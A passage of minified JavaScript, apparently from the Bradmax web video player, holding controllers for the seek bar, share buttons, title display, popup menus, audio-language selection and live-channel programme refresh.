xa||!this.isDvr||(this.isDvr=this.isLive=!1),this.updateProgressMetadataData()},onLiveButtonClick:function(b){this.isSeekingPossible()&&this.seekTo(this.duration)},onStageDown:function(b){this.lastMousePosition=this.getPointerPosition(b),this.updateMax()},onIndicatorDown:function(b){if(!this.isTrackDown&&null!=this.duration&&(null==this.lastMousePosition&&(this.lastMousePosition=this.getPointerPosition(b)),this.indicatorMax=this.progressView.track.calculateWidth()-this.indicatorWidth,this.updateMax(),0!=this.duration||this.isLive)){this.progressView.track.parent.hasEventListener("mousedown")&&this.progressView.track.parent.removeEventListener("mousedown",U(this,this.onTrackDown)),this.progressView.track.parent.hasEventListener("mouseup")&&this.progressView.track.parent.removeEventListener("mouseup",U(this,this.onTrackUp)),this.progressView.stage.addEventListener("mousemove",U(this,this.onMouseMove)),this.progressView.stage.addEventListener("mouseup",U(this,this.onMouseUp)),h.mobile&&(this.progressView.stage.addEventListener("touchmove",U(this,this.onMouseMove)),this.progressView.stage.addEventListener("touchend",U(this,this.onMouseUp))),this.disableHtmlSelection(),this.isIndicatorDown=!0,b=this.progressView.indicator.getGlobalPosition().x;var c=this.progressView.indicator.get_width()/2;this.lastMousePosition.x=b+c,this.updatePopupPosition(new Vb(this.indicatorCurrent,this.popupResizeOffset))}},onTrackOut:function(b){this.progressView.root.hasEventListener("mousemove")&&this.progressView.root.removeEventListener("mousemove",U(this,this.onTrackMove)),this.isIndicatorDown||this.progressPopup.destroy(),this.progressSegment.deselectAll(),this.progressMarker.deselectAll()},onTrackOver:function(b){this.isIndicatorDown||!this.isSeekingPossible()||this.isAdBreak()||(this.progressView.root.hasEventListener("mousemove")||this.progressView.root.addEventListener("mousemove",U(this,this.onTrackMove)),this.updatePopupPosition(new Vb(b.mouseX,this.popupResizeOffset)))},onTrackMove:function(b){this.isAdBreak()||this.updatePopupPosition(new Vb(b.mouseX,this.popupResizeOffset))},onMouseUp:function(b){this.isTrackDown||this.isAdBreak()||(this.progressPopup.destroy(),this.progressView.stage.removeEventListener("mousemove",U(this,this.onMouseMove)),this.progressView.stage.removeEventListener("mouseup",U(this,this.onMouseUp)),h.mobile&&(this.progressView.stage.removeEventListener("touchmove",U(this,this.onMouseMove)),this.progressView.stage.removeEventListener("touchend",U(this,this.onMouseUp))),b=this.targetMove/this.progressView.track.calculateWidth()*this.duration,this.seekTo(b),this.isIndicatorDown=!1,this.progressView.track.parent.hasEventListener("mousedown")||this.progressView.track.parent.addEventListener("mousedown",U(this,this.onTrackDown)),this.progressView.track.parent.hasEventListener("mouseup")||this.progressView.track.parent.addEventListener("mouseup",U(this,this.onTrackUp)),this.enableHtmlSelection())},onMouseMove:function(b){b.stopPropagation(),!this.isTrackDown&&this.isIndicatorDown&&(b=this.getPointerPosition(b),this.indicatorCurrent+=b.x-this.lastMousePosition.x,this.lastMousePosition.x=b.x,this.indicatorCurrent=this.indicatorCurrent<this.indicatorMin?this.indicatorMin:this.indicatorCurrent,this.targetMove=this.indicatorCurrent=this.indicatorCurrent>this.indicatorMax?this.indicatorMax:this.indicatorCurrent,this.progressView.indicator.set_left(this.indicatorCurrent-this.indicatorHalfWidth),this.progressView.indicator.update(),this.updatePopupPosition(new Vb(this.indicatorCurrent,this.popupResizeOffset)),this.updateProgressSegmentsProgress(this.indicatorCurrent/this.indicatorMax))},getPointerPosition:function(b){return new Vb(b.mouseX,b.mouseY)},disableHtmlSelection:function(){this.disableHtmlSelectionFunction=function(b){return b.preventDefault(),!1},window.document.addEventListener("selectstart",this.disableHtmlSelectionFunction)},enableHtmlSelection:function(){null!=this.disableHtmlSelectionFunction&&(window.document.removeEventListener("selectstart",this.disableHtmlSelectionFunction),this.disableHtmlSelectionFunction=null)},isSeekingPossible:function(){return!(0>=this.duration||this.isDvr&&this.duration<this.dvrMinLenForSeekbar)},isAdBreak:function(){return null!=this.adsDuration},updateMax:function(){this.indicatorMax=this.progressView.track.calculateWidth();var b=this.isDvr&&600>this.duration&&this.time+20>this.duration;this.isSeekingPossible()&&!b?(this.setProgressByTime(this.time),this.setIndicatorByTime(this.time)):(this.setProgressByTime(this.duration),this.setIndicatorByTime(this.duration))},onResize:function(b){this.updateMax(),this.popupResizeOffset=b.data.y-this.stageStartSize.y,this.updateProgressResize()},onTrackUp:function(b){var c=b.mouseX;h.mobile&&"touchend"==b.type&&(c=this.lastMousePosition.x),this.isTrackDown&&null!=c&&0<=c&&(b=c/this.progressView.track.calculateWidth()*this.duration,this.seekTo(b),this.updateMax()),this.isTrackDown=!1},onTrackDown:function(b){this.lastMousePosition=this.getPointerPosition(b),h.mobile&&null!=b.mouseX&&15>Math.abs(b.mouseX-this.indicatorCurrent)&&this.onIndicatorDown(b),this.isSeekingPossible()&&!this.isIndicatorDown&&(this.isTrackDown=!0)},seekTo:function(b){b>this.duration&&(b=this.duration-.5),0>b&&(b=0),this.isSeeking=!0;var c=new W("skinSeek");this.time=c.data=b,c.dispatch(this.context)},onCurrentTimeChange:function(b){null==b.data.currentTime||isNaN(b.data.currentTime)||this.isIndicatorDown||this.isSeeking||0>=this.duration&&!this.isLive||(this.onDurationChange(b),this.time=b.data.currentTime,this.isAdBreak()&&this.adEndTimeUpdate(),this.updateMax(),this.updateTimeText(),this.updateViewForLiveStream())},setProgressByTime:function(b){this.updateProgressSegmentsProgress(b/this.duration)},setIndicatorByTime:function(b){(b=this.progressView.track.calculateWidth()*b/this.duration)>this.indicatorMax&&(b=this.indicatorMax),b<this.indicatorMin&&(b=this.indicatorMin),b>this.progressView.track.calculateWidth()&&(b=this.progressView.track.calculateWidth()),this.progressView.indicator.set_left((0|b)-this.indicatorHalfWidth),this.progressView.indicator.update(),this.targetMove=this.indicatorCurrent=b},onDurationChange:function(b){null==b.data.duration||isNaN(b.data.duration)||0==b.data.duration&&0<this.media.duration||(this.duration=b.data.duration,null!=this.media&&null!=this.media.mediaPlaybackInfo&&this.media.mediaPlaybackInfo.isPlaying&&(this.updateMax(),this.updateProgressResize()))},onSeekingEnd:function(b){this.isSeeking=!1,null!=b&&null!=b.data&&null!=b.data.currentTime&&(this.time=b.data.currentTime,this.updateMax(),this.updateTimeText(),this.updateViewForLiveStream()),h.mobile&&this.progressPopup.destroy()},updateTimeText:function(){var b="";if(this.isDvr){0<this.media.mediaPlaybackInfo.currentTime&&(b=Yb.formatDateTime(new Date(1e3*this.media.mediaPlaybackInfo.currentTime)));var c="Live"}else b=Yb.formatTime(this.time>this.duration?this.duration:this.time),c=Yb.formatTime(this.duration);this.progressView.duration.set_text(c),this.progressView.time.set_text(b)},updateViewForLiveStream:function(){if(this.isDvr&&null!=this.progressView.liveButton){this.updateLiveStreamButtonState();var b=!1;this.progressView.liveButton.visible||(b=this.progressView.liveButton.visible=!0),null!=this.progressView.liveButtonPreSpacer&&(this.progressView.liveButtonPreSpacer.visible=!0),null!=this.progressView.liveButtonPostSpacer&&(this.progressView.liveButtonPostSpacer.visible=!0),this.progressView.duration.visible=!1;var c=this.isSeekingPossible(),d=this.progressView.track.visible;this.progressView.time.visible=c&&this.isDvrWallTimeMode,null!=this.progressView.timePreSpacer&&(this.progressView.timePreSpacer.visible=c&&this.isDvrWallTimeMode),null!=this.progressView.timePostSpacer&&(this.progressView.timePostSpacer.visible=c&&this.isDvrWallTimeMode),null!=this.progressView.slash&&(this.progressView.slash.visible=!1),this.progressView.segmentList.visible=c,this.progressView.markerList.visible=c,this.progressView.track.visible=c,(this.progressView.indicator.visible=c)||this.progressPopup.hide(),(d&&!c||!d&&c)&&(b=!0),b&&null!=this.progressView.root.parent&&this.progressView.root.parent.update()}},updateLiveStreamButtonState:function(){var b="sync"==this.progressView.liveButton.currentStateName[1],c=!0;this.isSeekingPossible()&&this.indicatorMax!=this.indicatorMin&&(c=.99<=(this.indicatorCurrent-this.indicatorMin)/(this.indicatorMax-this.indicatorMin)),(b&&!c||!b&&c)&&(this.progressView.liveButton.currentStateName[1]=c?"sync":"notsync",this.progressView.liveButton.setStateName(this.progressView.liveButton.currentStateName))},updatePopupPosition:function(b,c){if(null==c&&(c=!1),this.isAdBreak())this.progressPopup.hide();else{var d=this.progressView.track.calculateWidth();if(b.x<this.progressView.track.get_left()||b.x>this.progressView.track.get_left()+d)this.progressPopup.hide();else{var q=this.progressMarker.getPopupExtraLabel(b);null==q&&(q=this.progressSegment.getPopupExtraLabel(b)),this.progressPopup.drawExtraLabel(q),1==this.progressMarker.selectByPosition(b)?this.progressSegment.deselectAll():this.progressSegment.selectByPosition(b),d=b.x/d*this.duration;var X=this.isDvr?this.isDvrWallTimeMode?Yb.formatDateTime(new Date(1e3*this.media.mediaPlaybackInfo.currentTime),d-this.time|0):"-"+Yb.formatTime(this.duration-d|0):Yb.formatTime(d);this.progressView.popupLabel.set_text(X),this.progressPopup.drawThumbnail(d,c),this.progressPopup.updateSizeAndPosition(b,null!=q&&""!=q),this.progressPopup.build(!0),this.progressPopup.updateLastPosition(b)}}},onSkinHide:function(b){var c=this;0==this.skinHidden&&(null!=this.skinHideTimer&&this.skinHideTimer.stop(),this.skinHideTimer=Rb.delay((function(){c.skinHidden=!0}),0|ed.autoHideTimeout))},onSkinShow:function(b){null!=this.skinHideTimer&&this.skinHideTimer.stop(),this.skinHidden=!1,this.updateProgressResize(),this.updateProgressSegmentsProgress()},updateProgressMetadataData:function(){null==this.progressView||this.isAdBreak()||(this.progressPopup.parseMedia(this.media),this.progressPopup.updateStartPosition(),this.progressSegment.parseMedia(this.media,this.time,this.duration),0>=this.duration||this.progressMarker.parseMedia(this.media,this.duration))},updateProgressResize:function(){this.skinHidden||this.isAdBreak()||(this.progressPopup.updateStartPosition(),this.progressSegment.resize(this.media,this.time,this.duration),0>=this.duration||this.progressMarker.resize(this.media,this.duration))},updateProgressSegmentsProgress:function(b){if(!this.skinHidden&&!this.isAdBreak()){var c=this.isLive&&0<this.time?1:0;this.progressSegment.update(b,c),this.progressMarker.update(b,c)}},onThumbLoad:function(b){null!=b.data&&this.progressPopup.canUpdate(0|b.data)&&this.updatePopupPosition(this.progressPopup.getLastPosition(),!0)},__class__:xd});var Sd=function(){this.videoIsPlaying=!1,zb.call(this)};wa["bs.player.plugin.skin.controller.element.ShareButtonsController"]=Sd,Sd.__name__="bs.player.plugin.skin.controller.element.ShareButtonsController",Sd.__super__=zb,Sd.prototype=Ja(zb.prototype,{shareView:null,showConfig:null,videoIsPlaying:null,defaultRightOffset:null,rightOffset:null,init:function(){var b=this;zb.prototype.init.call(this),null!=this.view&&(this.shareView=this.view,null!=this.shareView.root&&(this.set_showConfig(Ic.getConfigValue(this.variables,"shareButtons")),this.addClickEvents(),this.renderButtons(),this.watchVideoEvents(),ma.add(this.context,ma.BRAND_IMAGE_LOADED,U(this,this.onBrandImageLoaded)),0==Ic.getConfigValue(this.variables,"showSkinOnInit")&&(this.shareView.root.set_visible_with_redraw(!1),this.destroyButtons(),T.addOnce(this.context,"playing",(function(c){b.shareView.root.set_visible_with_redraw(!0),b.renderButtons()})))))},destroy:function(){this.destroyButtons(),this.unwatchVideoEvents(),this.set_showConfig(null),zb.prototype.destroy.call(this)},onBrandImageLoaded:function(b){var c=fb.__cast(b.data,Sa);null==this.defaultRightOffset&&(this.defaultRightOffset=this.view.root.get_right()),"top"==b.data.yPos&&"right"==b.data.xPos?this.rightOffset=this.defaultRightOffset+c.width:(this.rightOffset=this.defaultRightOffset,this.defaultRightOffset=null),this.view.root.set_right(this.rightOffset)},renderButtons:function(){var b=this.isButtonVisible("embed");b&&(b=null!=uc.findEmbedScriptPath(this.variables,"bradmax_player_v2.14.380"));var c=this.isButtonVisible("mail"),d=this.isButtonVisible("facebook"),q=this.isButtonVisible("twitter"),X=this.isButtonVisible("linkedIn");yc.setAvailability(this.context,Rc.SHARE_BUTTONS,b||c||d||q||X),yc.getAvailability(this.context,Rc.SHARE_BUTTONS)?(null!=this.rightOffset&&this.view.root.set_right(this.rightOffset),this.view.root.alpha=1,this.view.root.visible=!0,this.buildRoot(),null!=this.shareView.embed&&(this.shareView.embed.visible=b),null!=this.shareView.mail&&(this.shareView.mail.visible=c),null!=this.shareView.facebook&&(this.shareView.facebook.visible=d),null!=this.shareView.twitter&&(this.shareView.twitter.visible=q),null!=this.shareView.linkedIn&&(this.shareView.linkedIn.visible=X),null!=this.shareView.embed&&(b?this.shareView.embed.buildNativeElement():this.shareView.embed.destroyNativeElement()),null!=this.shareView.mail&&(c?this.shareView.mail.buildNativeElement():this.shareView.mail.destroyNativeElement()),null!=this.shareView.facebook&&(d?this.shareView.facebook.buildNativeElement():this.shareView.facebook.destroyNativeElement()),null!=this.shareView.twitter&&(q?this.shareView.twitter.buildNativeElement():this.shareView.twitter.destroyNativeElement()),null!=this.shareView.linkedIn&&(X?this.shareView.linkedIn.buildNativeElement():this.shareView.linkedIn.destroyNativeElement()),this.shareView.root.update()):this.destroyButtons()},destroyButtons:function(){null!=this.shareView.embed&&(this.shareView.embed.visible=!1,this.shareView.embed.destroyNativeElement()),null!=this.shareView.mail&&(this.shareView.mail.visible=!1,this.shareView.mail.destroyNativeElement()),null!=this.shareView.facebook&&(this.shareView.facebook.visible=!1,this.shareView.facebook.destroyNativeElement()),null!=this.shareView.twitter&&(this.shareView.twitter.visible=!1,this.shareView.twitter.destroyNativeElement()),null!=this.shareView.linkedIn&&(this.shareView.linkedIn.visible=!1,this.shareView.linkedIn.destroyNativeElement()),this.destroyRoot()},isButtonVisible:function(b){return null!=this.showConfig&&-1<this.showConfig.indexOf(b.toLowerCase())},addClickEvents:function(){null!=this.shareView.embed&&this.shareView.embed.addEventListener("click",U(this,this.getEmbedCode)),null!=this.shareView.mail&&this.shareView.mail.addEventListener("click",uc.shareViaMail),null!=this.shareView.facebook&&this.shareView.facebook.addEventListener("click",uc.shareOnFacebook),null!=this.shareView.twitter&&this.shareView.twitter.addEventListener("click",uc.shareOnTwitter),null!=this.shareView.linkedIn&&this.shareView.linkedIn.addEventListener("click",uc.shareOnLinkedIn)},getEmbedCode:function(b){uc.showEmbedCodeWindow(this.context,this.variables,U(this,this.onEmbedCodeWindowClose)),this.unwatchVideoEvents(),this.dispatchPlayPause("skinPause")},onEmbedCodeWindowClose:function(){this.dispatchPlayPause("skinPlay"),this.watchVideoEvents()},dispatchPlayPause:function(b){this.videoIsPlaying&&new W(b).dispatch(this.context)},watchVideoEvents:function(){T.add(this.context,"playing",U(this,this.onVideoPlaying)),T.add(this.context,"paused",U(this,this.onVideoNotPlaying)),T.add(this.context,"stopped",U(this,this.onVideoNotPlaying)),T.add(this.context,"complete",U(this,this.onVideoNotPlaying))},unwatchVideoEvents:function(){T.remove(this.context,"playing",U(this,this.onVideoPlaying)),T.remove(this.context,"paused",U(this,this.onVideoNotPlaying)),T.remove(this.context,"stopped",U(this,this.onVideoNotPlaying)),T.remove(this.context,"complete",U(this,this.onVideoNotPlaying))},onVideoPlaying:function(b){this.videoIsPlaying=!0},onVideoNotPlaying:function(b){this.videoIsPlaying=!1},set_showConfig:function(b){return this.showConfig=null==b||""==b?"":b.toLowerCase()},__class__:Sd,__properties__:Ja(zb.prototype.__properties__,{set_showConfig:"set_showConfig"})});var Td=function(){zb.call(this)};wa["bs.player.plugin.skin.controller.element.TitleController"]=Td,Td.__name__="bs.player.plugin.skin.controller.element.TitleController",Td.__super__=zb,Td.prototype=Ja(zb.prototype,{titleView:null,init:function(){zb.prototype.init.call(this),null!=this.view&&(this.titleView=this.view,null!=this.titleView.stage&&null!=this.titleView.root&&null!=this.titleView.title&&null!=this.titleView.subtitle&&(na.add(this.context,"resize",U(this,this.resize)),aa.add(this.context,"mediaMetadataData",U(this,this.onMetadataData))))},destroy:function(){na.remove(this.context,"resize",U(this,this.resize)),aa.remove(this.context,"mediaMetadataData",U(this,this.onMetadataData)),zb.prototype.destroy.call(this)},onMetadataData:function(b){null!=(b=b.data)&&(null!=b.title&&""!=b.title?(this.titleView.title.set_text(b.title),this.titleView.title.visible=!0):(this.titleView.title.set_text(null),this.titleView.title.visible=!1),b instanceof Zb?(this.titleView.subtitle.set_text(this.getSubtitle(fb.__cast(b,Zb))),this.titleView.subtitle.visible=!0):(this.titleView.subtitle.set_text(null),this.titleView.subtitle.visible=!1),(this.titleView.title.visible||this.titleView.subtitle.visible)&&this.buildRoot(),this.titleView.title.visible?this.titleView.title.buildNativeElement():this.titleView.title.destroyNativeElement(),this.titleView.subtitle.visible?this.titleView.subtitle.buildNativeElement():this.titleView.subtitle.destroyNativeElement(),this.resize(),this.titleView.title.visible||this.titleView.subtitle.visible||this.destroyRoot(),this.titleView.root.update())},resize:function(b){this.titleView.subtitle.visible?(this.titleView.subtitle.set_bottom(0),this.titleView.title.set_bottom(0|this.titleView.subtitle.calculateTextHeight())):this.titleView.title.set_bottom(0)},getSubtitle:function(b){var c=b.season.seasonNumber+"";return b=b.episodeNumber+"",2>c.length&&(c="0"+c),2>b.length&&(b="0"+b),Yb.translate("season")+" "+c+" "+Yb.translate("episode")+" "+b},__class__:Td});var Mc=function(){this.isPopupShow=this.isPopupOver=this.isBtnOver=this.isBuild=!1,zb.call(this)};wa["bs.player.plugin.skin.controller.element.popup.core.PopupController"]=Mc,Mc.__name__="bs.player.plugin.skin.controller.element.popup.core.PopupController",Mc.__super__=zb,Mc.prototype=Ja(zb.prototype,{popupView:null,isPopupShow:null,isPopupOver:null,isBtnOver:null,isBuild:null,init:function(){zb.prototype.init.call(this),null!=this.view&&null!=this.view.stage&&null!=this.view.root&&(this.popupView=this.view,null!=this.popupView.popup&&(this.destroyPopup(),this.showSpacers(!1),this.popupView.popup.addEventListener("mouseenter",U(this,this.onPopupOver)),this.popupView.popup.addEventListener("mouseleave",U(this,this.onPopupOut)),this.popupView.root.addEventListener("mouseenter",U(this,this.onBtnOver)),this.popupView.root.addEventListener("click",U(this,this.onBtnOver)),this.popupView.root.addEventListener("mouseleave",U(this,this.onBtnOut)),this.popupView.stage.addEventListener("mouseenter",U(this,this.onStageOver))))},destroy:function(){null!=this.popupView&&(null!=this.popupView.popup&&(this.popupView.popup.removeEventListener("mouseenter",U(this,this.onPopupOver)),this.popupView.popup.removeEventListener("mouseleave",U(this,this.onPopupOut))),null!=this.popupView.root&&(this.popupView.root.removeEventListener("mouseenter",U(this,this.onBtnOver)),this.popupView.root.removeEventListener("click",U(this,this.onBtnOver)),this.popupView.root.removeEventListener("mouseleave",U(this,this.onBtnOut))),null!=this.popupView.stage&&this.popupView.stage.removeEventListener("mouseenter",U(this,this.onStageOver))),zb.prototype.destroy.call(this)},buildRoot:function(b){null==b&&(b=!1),this.isViewRootBuild||null==this.view||null==this.view.root||(this.showSpacers(!0),this.view.root.buildNativeElement(b),this.isViewRootBuild=!0,null!=this.view.root.parent&&fb.__cast(this.view.root.parent,Xb).update())},destroyRoot:function(){this.isViewRootBuild&&null!=this.view&&null!=this.view.root&&(this.showSpacers(!1),this.isViewRootBuild=!1,this.view.root.destroyNativeElement(),null!=this.view.root.parent&&fb.__cast(this.view.root.parent,Xb).update())},showSpacers:function(b){null!=this.popupView.preSpacer&&(this.popupView.preSpacer.visible=b),null!=this.popupView.postSpacer&&(this.popupView.postSpacer.visible=b)},onBtnOver:function(b){null!=b&&b.stopPropagation(),b=this.popupView.root.getGlobalPosition(),this.isBtnOver=!0;var c=b.x+(this.popupView.root.get_width()-this.popupView.popup.get_width())/2,d=this.popupView.stage.get_width()-this.popupView.popup.get_width()-10;c>d&&(c=d),this.popupView.popup.set_left(c),this.popupView.popup.set_top(b.y-this.popupView.popup.calculateHeight()-this.popupView.popup.get_bottom()),this.popupShow()},onPopupOver:function(b){this.setRootState(["over"]),this.isPopupOver=!0,this.popupShow()},onStageOver:function(b){this.isPopupOver=this.isBtnOver=!1,b.stopPropagation(),this.checkPopupHide()},onBtnOut:function(b){null!=b&&b.stopPropagation(),this.isBtnOver=!1,this.checkPopupHide()},onPopupOut:function(b){this.isPopupOver=!1,this.checkPopupHide()},popupShow:function(){this.isPopupShow=!0,this.isBuild?this.popupView.popup.set_alpha_with_redraw(1):(this.popupView.popup.alpha=1,this.buildPopup())},checkPopupHide:function(){this.isPopupShow&&Rb.delay(U(this,this.checkPopupHideDelayed),50)},checkPopupHideDelayed:function(){!this.isPopupShow||this.isBtnOver||this.isPopupOver||(this.popupView.popup.alpha=0,this.destroyPopup(),this.isPopupShow=!1,this.setRootState(["normal"]))},setRootState:function(b){this.view.root.setStateName(b)},destroyPopup:function(){this.isBuild&&(this.popupView.popup.visible=!1,this.popupView.popup.destroyNativeElement(),this.isBuild=!1)},buildPopup:function(){this.isBuild||(this.popupView.popup.visible=!0,this.popupView.popup.buildNativeElement(!0),this.isBuild=!0)},__class__:Mc});var vc=function(){this.autoSize=!0,this.isScrollOver=!1,Mc.call(this)};wa["bs.player.plugin.skin.controller.element.popup.core.PopupListController"]=vc,vc.__name__="bs.player.plugin.skin.controller.element.popup.core.PopupListController",vc.__super__=Mc,vc.prototype=Ja(Mc.prototype,{listView:null,data:null,listElements:null,isScrollOver:null,autoSize:null,init:function(){Mc.prototype.init.call(this),null!=this.view&&(this.listView=this.view,null!=this.listView.list&&null!=this.listView.popup&&(this.listView.popup.overflowHidden=!0,this.listView.root.visible=!1,this.destroyRoot(),this.autoSize&&this.listView.popup.set_height(this.listView.list.calculateListHeight()+this.listView.list.get_top()+this.listView.list.get_bottom()),this.listView.stage.addEventListener("mouseup",U(this,this.onStageUp)),na.add(this.context,"resize",U(this,this.onResize))))},onResize:function(b){this.destroyPopup()},destroy:function(){null!=this.listView&&null!=this.listView.stage&&this.listView.stage.removeEventListener("mouseup",U(this,this.onStageUp)),Mc.prototype.destroy.call(this)},popupShow:function(){this.updatePopupListHeight(),Mc.prototype.popupShow.call(this)},updatePopupListHeight:function(){if(!(null==this.listView||null==this.listView.list||null==this.listView.list.data||2>this.listView.list.data.length)){var b=this.view.stage.get_height(),c=this.getPlayerTopHeaderHeight();b=b-c-this.getPlayerBottomPanelHeight(),c=this.listView.list.calculateListHeight(),c+=this.getPopupListAdditionalPadding(),this.listView.popup.set_height(Math.min(b,c)),this.listView.list.update()}},getPopupListAdditionalPadding:function(){return 0},getPlayerTopHeaderHeight:function(){var b=0;null!=this.view.stage.views&&null!=this.view.stage.views.shareButtonsView&&null!=this.view.stage.views.shareButtonsView.root&&null!=this.view.stage.views.shareButtonsView.root.element&&(b+=this.view.stage.views.shareButtonsView.root.get_top(),b+=this.view.stage.views.shareButtonsView.root.get_height());var c=0;if(null!=this.view.stage.views&&null!=this.view.stage.views.brandButtonView&&null!=this.view.stage.views.brandButtonView.button&&null!=this.view.stage.views.brandButtonView.button.element&&null!=this.view.stage.views.brandButtonView.button.image&&null!=this.view.stage.views.brandButtonView.button.parent){var d=this.view.stage.views.brandButtonView.button,q=d.get_left()>d.parent.calculateWidth()/2,X=0==d.get_top();q&&X&&(c+=d.parent.get_top(),c+=d.image.get_height())}return Math.max(b,c)},getPlayerBottomPanelHeight:function(){var b=0;return null!=this.view.stage.views&&null!=this.view.stage.views.controlbarView&&null!=this.view.stage.views.controlbarView.container&&(b=this.view.stage.views.controlbarView.container,b=this.view.stage.get_height()-b.parent.calculateY()-b.calculateY()),b},onBtnOver:function(b){this.updatePopupListHeight(),Mc.prototype.onBtnOver.call(this,b)},onStageOver:function(b){this.isScrollOver=this.isBtnOver=this.isPopupOver=!1,b.stopPropagation(),this.checkPopupHide()},buildPopup:function(){this.isBuild||(Mc.prototype.buildPopup.call(this),this.buildList())},destroyPopup:function(){this.isBuild&&(this.destroyList(),Mc.prototype.destroyPopup.call(this))},checkPopupHideDelayed:function(){this.listView.list instanceof Ua&&(this.isScrollOver=fb.__cast(this.listView.list,Ua).isIndicatorDown),0==this.isScrollOver&&Mc.prototype.checkPopupHideDelayed.call(this)},onStageUp:function(b){this.checkPopupHide()},buildList:function(){this.listView.list.visible=!0,this.listView.list.buildNativeElement(),this.listView.list.redrawItems()},destroyList:function(){this.listView.list.visible=!1,this.listView.list.destroyNativeElement()},__class__:vc});var Ud=function(){vc.call(this)};wa["bs.player.plugin.skin.controller.element.popup.AudioPopupListController"]=Ud,Ud.__name__="bs.player.plugin.skin.controller.element.popup.AudioPopupListController",Ud.__super__=vc,Ud.prototype=Ja(vc.prototype,{init:function(){vc.prototype.init.call(this),null!=this.listView&&null!=this.listView.list&&(aa.add(this.context,"audioData",U(this,this.onAudioData)),aa.add(this.context,"mediaMetadataData",U(this,this.onMediaData)))},destroy:function(){aa.remove(this.context,"audioData",U(this,this.onAudioData)),aa.remove(this.context,"mediaMetadataData",U(this,this.onMediaData)),vc.prototype.destroy.call(this)},onAudioData:function(b){if(null==b.data)this.listView.root.visible=!1,this.destroyRoot();else{var c=b.data;b=[];for(var d=0;d<c.length;){var q=c[d];++d,null!=q.name&&""!=q.name&&"null"!=q.name&&null!=q.languageCode&&""!=q.languageCode&&"null"!=q.languageCode&&b.push({label:q.name,data:q})}if(1<b.length){for(this.listView.root.visible=!0,this.buildRoot(!0),this.listView.list.set_data(b),d=0;d<b.length;)if(c=b[d],++d,c.data.isDefault){this.listView.list.select(c);break}this.listView.list.onItemSelect=U(this,this.onItemSelect),this.setDefaultLang(),this.updatePopupListHeight()}else this.listView.root.visible=!1,this.destroyRoot()}},onMediaData:function(b){this.listView.root.visible=!1,this.destroyRoot()},onItemSelect:function(b,c){(c=new W("selectAudio")).data=b.data,c.dispatch(this.context),b=null,null!=c.data&&(b=c.data.languageCode),this.setUserSettingsLang(b)},setDefaultLang:function(){if(null!=this.listView.list.data){for(var b=this.listView.list.data,c=[],d=0;d<b.length;){var q=b[d];++d,c.push(q.data.languageCode)}if(0!=c.length){var X=null;if(null!=this.variables.audio&&(X=ba.findBestFittingLangCodeForSelected(this.variables.audio,c)),null!=(d=this.getUserSettingsLang())&&(null!=(c=ba.findBestFittingLangCodeForSelected(d,c))&&(X=c)),null!=X)for(c=0,d=b.length;c<d;)if(b[q=c++].data.languageCode==X){this.listView.list.select(this.listView.list.data[q]);break}}}},setUserSettingsLang:function(b){if(null!=Tb.getSessionStorage())try{null==b?Tb.getSessionStorage().removeItem("_brplayer_aud_lang"):Tb.getSessionStorage().setItem("_brplayer_aud_lang",null==b?"null":""+b)}catch(c){}},getUserSettingsLang:function(){var b=null;if(null!=Tb.getSessionStorage())try{b=Tb.getSessionStorage().getItem("_brplayer_aud_lang")}catch(c){}return b},__class__:Ud});var Id=function(){vc.call(this),this.media=null,this.isLiveChannelsListLoading=this.videoEventAdded=!1,this.nextProgrammeTimer=this.epgEefreshTimer=this.lastEpgRefreshDate=null};wa["bs.player.plugin.skin.controller.element.popup.ChannelsController"]=Id,Id.__name__="bs.player.plugin.skin.controller.element.popup.ChannelsController",Id.__super__=vc,Id.prototype=Ja(vc.prototype,{media:null,videoEventAdded:null,playbackStateMonitor:null,isLiveChannelsListLoading:null,lastEpgRefreshDate:null,epgEefreshTimer:null,nextProgrammeTimer:null,init:function(){this.autoSize=!1,vc.prototype.init.call(this),null!=this.view&&(this.listView.root.visible=!1,this.destroyRoot(),this.playbackStateMonitor=new ha(this.context),this.playbackStateMonitor.init(),aa.add(this.context,"mediaMetadataData",U(this,this.onMetadataData)),aa.add(this.context,"liveChannelsData",U(this,this.onLiveChannelsData)))},destroy:function(){this.playbackStateMonitor.destroy(),aa.remove(this.context,"mediaMetadataData",U(this,this.onMetadataData)),aa.remove(this.context,"liveChannelsData",U(this,this.onLiveChannelsData)),vc.prototype.destroy.call(this)},buildList:function(){this.listView.list.visible=!0,this.listView.list.compare=U(this,this.compareLiveChannels),this.listView.list.onItemSelect=U(this,this.onClickPlay),this.listView.list.select(this.media)},stopNextProgrammeTimer:function(){null!=this.nextProgrammeTimer&&(this.nextProgrammeTimer.stop(),this.nextProgrammeTimer=null)},startNextProgrammeTimer:function(){if(this.stopNextProgrammeTimer(),null!=this.media&&this.media instanceof Ba){var b=this.media.findProgramForDate();null!=b&&null!=b.eventEnd&&(b=b.eventEnd.getTime()-(new Date).getTime()|0,this.nextProgrammeTimer=Rb.delay(U(this,this.onNextProgramStart),b+1e3))}},onNextProgramStart:function(){if(null!=this.media&&this.media instanceof Ba){var b=new aa("liveChannelsNextProgramData");b.data=this.media,b.dispatch(this.context),this.startNextProgrammeTimer()}},stopEpgRefreshTimer:function(){null!=this.epgEefreshTimer&&(this.epgEefreshTimer.stop(),this.epgEefreshTimer=null)},startEpgRefreshTimer:function(){this.stopEpgRefreshTimer();var b=9e5;null!=this.lastEpgRefreshDate&&(0>(b=9e5+this.lastEpgRefreshDate.getTime()-(new Date).getTime()|0)&&(b=0)),this.epgEefreshTimer=Rb.delay(U(this,this.refreshLiveChannelisData),b)},refreshLiveChannelisData:function(){if(this.media instanceof xa){var b=null!=this.listView.list.data&&0<this.listView.list.data.length,c=null==this.lastEpgRefreshDate||9e5<(new Date).getTime()-this.lastEpgRefreshDate.getTime();this.isLiveChannelsListLoading||b&&!c||(this.isLiveChannelsListLoading=!0,new W("getLiveChannels").dispatch(this.context)),this.startEpgRefreshTimer()}},onMetadataData:function(b){this.media=b.data,this.updateCurrentMediaProgramsList(),this.startNextProgrammeTimer(),this.refreshLiveChannelisData()},onLiveChannelsData:function(b){this.isLiveChannelsListLoading=!1,this.lastEpgRefreshDate=new 